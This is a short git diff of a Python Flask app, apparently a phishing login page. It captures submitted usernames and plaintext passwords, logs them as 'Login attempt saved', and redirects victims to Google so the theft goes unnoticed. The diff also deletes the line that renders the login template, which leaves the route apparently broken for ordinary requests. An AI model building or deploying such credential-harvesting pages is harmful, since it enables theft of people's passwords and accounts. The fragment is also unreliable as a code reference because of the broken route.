@@ -22,10 +22,11 @@ def hello_world():
         print(f"Login attempt saved - Username: {username}")
         print(f"Login attempt saved - password: {password}")
     
-        return redirect("https://www.bing.com/ck/a?!&&p=d0a136b08a75752eb75f23cd5f09c07461711c07458b9188b3593200362d901eJmltdHM9MTc1OTAxNzYwMA&ptn=3&ver=2&hsh=4&fclid=0ce08f83-a7fe-62cb-26bf-9e72a609639f&psq=google&u=a1aHR0cHM6Ly93d3cuZ29vZ2xlLmNvLmluLw")
-    return render_template("index.html")
+        return redirect("https://www.google.com")
+    
 
 if __name__ == "__main__":
     app.run(debug=True, port=1111)
+
 
 
